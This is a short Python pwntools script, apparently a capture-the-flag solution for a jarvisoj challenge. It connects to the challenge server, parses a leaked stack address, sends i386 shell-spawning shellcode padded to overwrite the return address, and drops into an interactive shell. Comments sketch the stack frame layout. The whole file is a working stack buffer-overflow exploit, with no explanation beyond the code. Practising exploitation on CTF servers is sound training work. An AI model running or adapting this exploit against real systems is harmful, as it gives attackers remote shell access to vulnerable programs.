# -*- coding: utf-8 -*-
from pwn import *
#context.arch = 'i386'
#context.os = 'linux'
#context.endian = 'little'
#context.word_size = 32
conn = remote('pwn2.jarvisoj.com', 9877)
addr = conn.recvuntil(':', drop = True)
addr = conn.recvline()[2:-2]
addr = int(addr, 16)
shell_code = asm(shellcraft.i386.linux.sh())
shell_code_len = len(shell_code)
payload = shell_code + (0x8c - shell_code_len) * 'A' + p32(addr)
#print(payload)
conn.sendline(payload)
conn.interactive()

##
##H
##
##ret (4 Byte)
##rbp (4 Byte)
##136 Byte
##
##
##L

